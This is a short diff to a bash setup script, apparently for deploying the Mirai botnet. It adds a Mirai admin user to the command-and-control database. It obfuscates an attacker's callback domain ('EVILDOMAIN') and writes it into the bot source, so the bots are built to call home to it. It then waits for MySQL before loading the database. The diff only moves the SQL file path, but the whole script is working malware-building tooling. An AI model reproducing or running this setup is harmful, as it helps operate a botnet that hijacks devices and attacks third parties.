@@ -1,14 +1,14 @@
 #!/usr/bin/env bash
 
 echo "INSERT INTO users VALUES (NULL, '$MIRAI_ADMIN_USERNAME', '$MIRAI_ADMIN_PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');" \
->> db.sql
+>> source/db.sql
 
 myenc string $EVILDOMAIN | sed 's/\\/\\\\/g' > test.txt\
       && export EVILDOMAIN_HEX=`cat test.txt` \
       && sed -i "s/insert_here/$EVILDOMAIN_HEX/g" source/bot/table.c \
       && rm test.txt
 
-until mysql -h$MYSQL_HOST -uroot -p$MYSQL_PASSWORD < db.sql; do
+until mysql -h$MYSQL_HOST -uroot -p$MYSQL_PASSWORD < source/db.sql; do
   >&2 echo "Mysql is unavailable - sleeping"
   sleep 1
 done
